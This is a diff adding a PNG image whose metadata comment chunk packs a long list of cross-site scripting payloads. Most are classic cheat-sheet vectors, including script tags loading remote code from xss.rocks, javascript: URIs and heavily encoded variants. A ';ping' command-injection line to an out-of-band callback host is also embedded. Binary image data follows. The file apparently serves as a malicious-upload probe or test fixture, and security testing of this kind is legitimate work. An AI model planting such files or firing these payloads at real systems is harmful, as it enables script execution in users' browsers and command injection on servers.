@@ -1,0 +1,89 @@
+‰PNG
+
+   IHDR         k¬XT   cPLTE   ½=Dÿÿÿ/]æ·¸Ş¡Ímr6IqÅU[âåë'<gRc…ÅË×Œ—®©±Âñòõâåê÷çè÷æèîÎĞ~Š¤o}šš¤¸DV{-1ZÓØá·¾Ì`pap`po}™¸¾Ì2=f\²…6   tRNS @æØf  LtEXtComment '`"><\x3Cscript>javascript:alert(1)</script>        
+'`"><\x00script>javascript:alert(1)</script>
+<SCRIPT>alert('XSS');</SCRIPT>
+'';!--"<XSS>=&{()}
+<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+SRC=&#10<IMG 6;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+<IMG SRC="jav	ascript:alert('XSS');">
+<IMG SRC="jav&#x09;ascript:alert('XSS');">
+<IMG SRC="jav&#x0A;ascript:alert('XSS');">
+;ping l7ttvqq6ek4o8his8gsje231asgi47.oastify.com
+<IMG SRC=" &#14;  javascript:alert('XSS');">
+<IMG%0aSRC%0a=%0a"%0aj%0aa%0av%0aa%0as%0ac%0ar%0ai%0ap%0at%0a:%0aa%0al%0ae%0ar%0at%0a(%0a'%0aX%0aS%0aS%0a'%0a)%0a"%0a>
+<IMG SRC=java%00script:alert(\"XSS\")>
+<SCR%00IPT>alert(\"XSS\")</SCR%00IPT>
+<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT SRC=http://xss.rocks/xss.js?<B>
+<IMG SRC="javascript:alert('XSS')"
+<SCRIPT>a=/XSS/
+\";alert('XSS');//
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+<BODY BACKGROUND="javascript:alert('XSS')">
+<BODY ONLOAD=alert('XSS')>
+<IMG DYNSRC="javascript:alert('XSS')">
+<IMG LOWSRC="javascript:alert('XSS')">
+<BGSOUND SRC="javascript:alert('XSS');">
+<BR SIZE="&{alert('XSS')}">
+<LAYER SRC="http://xss.rocks/scriptlet.html"></LAYER>
+<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
+<LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">
+<STYLE>@import'http://xss.rocks/xss.css';</STYLE>
+<META HTTP-EQUIV="Link" Content="<http://xss.rocks/xss.css>; REL=stylesheet">
+<STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>
+<IMG SRC='vbscript:msgbox("XSS")'>
+<IMG SRC="mocha:[code]">
+<IMG SRC="livescript:[code]">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+<META HTTP-EQUIV="Link" Content="<javascript:alert('XSS')>; REL=stylesheet">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
+<TABLE BACKGROUND="javascript:alert('XSS')">
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
+<DIV STYLE="width: expression(alert('XSS'));">
+<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+<XSS STYLE="xss:expression(alert('XSS'))">
+exp/*<XSS STYLE='no\xss:noxss("*//*");
+<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
+<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
+<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+<BASE HREF="javascript:alert('XSS');//">
+<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>
+<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>
+getURL("javascript:alert('XSS')")
+a="get";
+<!--<value><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC="javas<![CDATA[cript:alert('XSS');">
+<XML SRC="http:/xss.rocks/xsstest.xml" ID=I></XML>
+<HTML><BODY>
+<SCRIPT SRC="http://xss.rocks/xss.jpg"></SCRIPT>
+<!--#exec cmd="/bin/echo '<SCRIPT SRC'"--><!--#exec cmd="/bin/echo '=http://xss.rocks/xss.js></SCRIPT>'"-->
+<? echo('<SCR)';
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;">
+<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
+<SCRIPT a=">" SRC="http://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT a=">" '' SRC="http://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT "a='>'" SRC="http://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT a=`>` SRC="http://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="xss.rocks/xss.js"></SCRIPT>
+ö™*  	{IDATxÚìœkÓ“0…u½dØ\gAh½üÿ_é‚T¤Ù£¢3GÎ‡T·os3aë‹K—.]ºtéÒ¥K—.]ºtéÒ¥K—.]ºtéÒ¥K—.ızÕšŞ¿ü«ºxÕš® ~8ß¶`øÆÑz˜æWP(@PôNŸ!`tF3 ú&pÀhOã€`4S@áì Ø3yyáıÜDœUuOqØê;PşĞ©W€§Un?¿>­õh÷ó~ÔŸ®Šk=AĞ‰lNKuy&Í¨hv6?:û0¨ÓDêb$ªì¬ @ñé7Á$
+õô˜DQ™·#‘Õî™¢rtz J•ù} g“b”)İŠft şÇ Óïó:­çŠ¥ÔÁÌ«9wµÑduĞäÅ¬êĞxv ë¿BÃ<(¿¸Wu³}l–áÇ,Ş~€¶úôùİ_• Šxcb½Ş÷zİ„ƒ CU(€læ˜€QÙ¦`~=LÑTZ€³÷>Ò(ãÇıœ¥2R”1ónÊR	DE^Ìs]@NÆ{êVPƒl»ÓÀûdÂZOOÛŸ¼Öc Âûú4š¯€ÕéjGqZX‹lÍEq?V ¿‚š\³"°kêŠİ È«·¢®Ñ{€ÈŠMu~ÔÉjÁHİ#†L³ÊhPüöšÑ.“:³	d¨Ù Üìİ×ó+Yãj?…¥L2? ¡µ ,8½½=MQŞV·µ:?@üĞ«¨ > Óßê“Õë= q„ &`~H7ÊT€ ê!È7@æ¨€`€Ñ@y êÎ€ƒs#ÑBø‹eô»õl¥ÒÉÖú$oìCğR¡”×
+ }~ıWõâ‘»£EÑª{¶úï–hÑ'Ş×ÍD‹Ò¯‚ì:÷DÈ©›ó!VvÖÈj;ÈqU·hÀ VO…»Ù>Ì­d?Ôî©p¦4’SO¹?ÍÏ§¤-”œ²ˆuPW€“]›WŒúdef%˜üÊ$§øq, ®ƒ‘Ëÿ¦€ìİÙ˜2·{µ,¼¾û¤<,ñ°úlƒştx'Ø+ z¬İ
+¿òO¿o, ‹v­ÕëÁP@Ñ4İ"SÈê~Èƒ`Fj:€<¦~ÈrÍàiU¼ëø©€GüÎ<¥õ Yj2€ù¿º-4I³#*ÀÎêÔP²m^2Á8oÎÑ¡¨ÍD:ˆİjt	¬óÖÖè¶¿™Dù ¨[@ÍĞÓ˜#±â'ö‰²L)šÑLÎk â-Qßl ®ˆÙÔ×ÁÈm‹S–Ì]Ì&şePv
+ÍŠòãõ¾«ÌşP³ß~~×` }ø)¨ ¼ÃU•ÍA› v¸0Ú£€,5€#ÔášA0ø ‚A§`­½yöi¢\U7R™ˆ¬ˆŸ?ĞùC Bq@¦UõmnÔ³OŠÁ>º  ÓØ&³şˆÉ¥vZÙA Íi Ñœ}0D¸UvTo"Eo 4!Ÿ~ìIäÀÆ$òÁVÙptz e“"+~ÂÈ*~’ñT?1)jÁ”ÁaĞéŒÃ¼N•VÙ,ƒ/µŸy5Ûzmp ég “o‚¬5°Š¨ÛÇv¿`B½¸öñùÓ7BßË8ğ†C­²ù(¨ñVYb0½øqG[eoMà€Ñ˜60ê€ÑLAÿ“?¿ı«R`B êd|j••JGQF¿«R™ˆ¦§æÊ¨É‘o»S‹Ññ'«=øeâ&	nv§<âwƒÔöŠÜì‘Ø+Ğá
+[em]gr3¨Õ#Ë7È’:¿H£jt¢”j£Ä´€š ÈUëÉ*~²\½ŠÑèØŒİQo7 #Ã-WuoA«¬_ßUAıG š€ûı!-oòuİYÿ€±õ£p¼‚ÚàC@®vK¨U€L|…@M"êp5T€1zÔD ìp-Àn”é0¨;; v]×Å®÷sÏKdÌûU;v]\ê¯¥?zZ”Œşˆ?~_-+ W`|åtÇ óØòXïH|µìÏ‚N¿X´k]®\Ğ,O…=ø¢ÔøSĞç7U[ …Æ µK$«S’f4Ì §‚¼ |úHWX|m´Èj6É×~äg98ÅO™|m4, Œ@g`>®ã*ŞwzÖ»Ùl–±n•½ÿÄu½_@ç_Ze5}°?^5}&[e£~
+‚şÍÿ?À0ÚuÇ@È7€uŒ¨ªŠU¥p#ºË?×Tæºr2¶ùõyO«Ò ?âY?D¥À ´7:l &x8ıÄz¯@´ÈV;šÓPÜWis	¬“˜À¡hbmE‹ì[@Ş–/Jëp-$ÊGAíé“Mj«lºMz«löšQOá¦9ÊÍàò|kËu0ÅTmÔÌ·›X¹T¾‚Z`ØÿÂVõû¾nöÍü÷YÔX«ìvîv¥a ˆÂpçø±6ÙÍFqÑû¿O«D”v&X)MàœçgÄ…}Ú&ÛéKtÏ2¸>$÷r¼Ğğ‡…ÒóMıpØûA°Ñ}	öó£²[¸):= \ç¨ì€× L^;@*GÀĞZKÎÔ«éxııä¿¼”7 İ9cµ–êÏ®çy¡õü<âÇ!xÄŸ“ÿ~yìı¹('MßuÑB«˜wê|F-Îvædso§ãÒB^²¼úWgàYÈX8*Û/äíÂ3·uıù¨ÁQÙên4£ºÅ€p¡Úyaê¦ÊæÚ§;ù°8ÑSjcvÂŒ}pæ¶¸_INÈ©Õaí İ×£œÒü!Gmğ§%¥él£)§à¬@ïÏXjåó·VŸ*;oÄ™qâ<ĞŸ¯ø?¸t¡´™Û  ¶D@®`¿9/7µ9 9 9 9 9 9 9x ·3r
+`äÀÈ)€‘S #§ FNŒœ<’ÓS S S S S S S€'rº#däÀÈ)€‘S #§ FNŒœ¹İ=9İ9 9 9 9 9 9 9}6r
+`äÀÈ)€‘S #§ FNŒœ¹ˆˆˆˆˆ|´    ‚ü­¹   à Z)¢Ëgîÿ    IEND®B`‚
